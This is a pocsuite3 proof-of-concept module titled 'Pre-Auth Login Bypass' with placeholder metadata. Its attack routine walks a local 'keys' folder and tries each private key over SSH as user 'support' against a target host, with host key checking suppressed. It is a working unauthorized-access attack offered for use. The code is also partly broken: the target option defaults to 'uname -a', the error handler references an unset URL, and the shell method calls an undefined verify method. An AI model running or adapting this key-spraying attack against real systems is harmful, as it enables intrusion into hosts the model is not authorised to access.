from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)

import os
minimum_version_required('1.9.6')
class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = ''
    vulDate = '2023-09-15'
    createDate = '2023-09-15'
    updateDate = '2023-09-15'
    references = []
    name = 'Pre-Auth Login Bypass'
    appPowerLink = ''
    appName = ''
    appVersion = ''
    vulType = 'Login Bypass'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''
    def _options(self):
        o = OrderedDict()
        o['ip'] = OptString('uname -a', description='The command to execute')
        return o
    def _attack(self):
        target = self.get_option('ip')
        print(target)
        for root, dirs, files in os.walk("keys"):
            for file in files:
                key_file = str(os.path.join(root, file))
                print(f"(*) Trying key: {key_file}\n")
                ssh_command = ['ssh', '-i', key_file, 'support@' + target, '-p','22', '-o','StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', '-o', 'BatchMode=yes' , '2>/dev/null']
                try:
                    ssh_command = ' '.join(ssh_command)
                    coutput = os.system(ssh_command)
                except Exception as e:
                    log = f"(-) Failed connecting to {self.url}:{22} with key {key_file}!"
                    continue
    def _shell(self):
        return self._verify()
register_poc(DemoPOC)

